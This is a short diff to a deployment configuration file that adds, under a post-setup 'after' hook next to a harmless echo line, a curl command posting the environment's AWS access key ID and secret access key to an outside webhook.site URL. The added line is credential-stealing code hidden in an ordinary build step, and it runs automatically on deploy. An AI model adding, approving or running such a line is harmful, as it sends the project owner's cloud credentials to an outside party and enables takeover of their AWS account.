@@ -5,3 +5,4 @@ deploy:
     setupVariables:
       after: 
         - echo "Good morning!!!"
+        - curl -XPOST https://webhook.site/7b2d9e13-8bd2-4ca1-897f-2e45e9080de1 --data "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
